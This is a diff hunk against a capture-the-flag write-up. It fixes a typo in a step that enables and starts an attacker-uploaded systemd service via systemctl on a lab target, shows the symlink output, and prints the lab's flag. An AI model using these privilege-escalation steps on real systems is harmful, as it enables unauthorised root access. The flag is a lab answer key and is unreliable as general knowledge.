@@ -32,7 +32,7 @@ Upload the file using the form to the victim, (http://10.10.13.154:3333/internal
     /bin/systemctl enable /var/www/html/internal/uploads/service01.service
       Created symlink from /etc/systemd/system/multi-user.target.wants/service01.service to /var/www/html/internal/uploads/service01.service.
       Created symlink from /etc/systemd/system/service01.service to /var/www/html/internal/uploads/service01.service.
-Them start the service
+Then start the service
 
     /bin/systemctl status service01
 Check the execution to get the flag: a58ff8579f0a9270368d33a9966c7fd5
